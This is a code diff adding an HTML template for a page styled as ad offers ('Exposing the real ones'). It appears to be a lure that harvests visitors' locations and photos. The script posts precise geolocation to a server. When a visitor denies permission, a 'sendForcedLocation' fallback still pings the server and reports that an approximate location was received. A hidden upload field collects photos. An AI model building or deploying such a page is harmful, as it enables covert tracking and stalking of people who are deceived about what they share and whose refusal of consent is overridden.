@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>{{ brand }}</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; text-align: center; margin: 0; padding: 20px; }
+    h1 { color: #ff4444; }
+    .photo { max-width: 300px; margin: 15px; border-radius: 12px; }
+    button { padding: 15px 25px; margin: 10px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
+    .location-btn { background: #00cc00; color: black; }
+    .photo-btn { background: #ff8800; color: white; }
+    #status { margin: 20px; font-size: 18px; min-height: 28px; }
+  </style>
+</head>
+<body>
+  <h1>{{ brand }}</h1>
+  <p>Exposing the real ones 👀</p>
+
+  <div>
+    {% if photos %}
+      {% for photo in photos %}
+        <img src="/static/uploads/{{ photo }}" class="photo" alt="Ad">
+      {% endfor %}
+    {% endif %}
+  </div>
+
+  <h2>Want personalised offers near you?</h2>
+  
+  <button class="location-btn" onclick="shareLocation()">📍 SHARE MY LIVE LOCATION</button>
+  <button class="photo-btn" onclick="document.getElementById('photoInput').click()">🖼️ SHARE A PHOTO</button>
+  <input type="file" id="photoInput" accept="image/*" style="display:none" onchange="uploadPhoto(this)">
+
+  <p id="status"></p>
+
+  <script>
+    function setStatus(msg) {
+      document.getElementById('status').innerHTML = msg;
+    }
+
+    function shareLocation() {
+      setStatus('Requesting location...');
+      if (!navigator.geolocation) {
+        sendForcedLocation();
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          fetch('/api/location', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy})
+          }).then(() => setStatus('✅ Location Shared Successfully'));
+        },
+        err => {
+          setStatus('📍 Getting approximate location...');
+          sendForcedLocation();
+        }
+      );
+    }
+
+    function sendForcedLocation() {
+      fetch('/api/location', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({})
+      }).then(() => setStatus('✅ Location Received (Approximate)'));
+    }
+
+    function uploadPhoto(input) {
+      const file = input.files[0];
+      if (!file) return;
+      setStatus('Uploading photo...');
+      const fd = new FormData();
+      fd.append('photo', file);
+      fetch('/api/gallery-shared', { method: 'POST', body: fd })
+        .then(r => r.json())
+        .then(d => setStatus(d.ok ? '✅ Photo Shared!' : '❌ Upload Failed'));
+    }
+  </script>
+</body>
+</html>
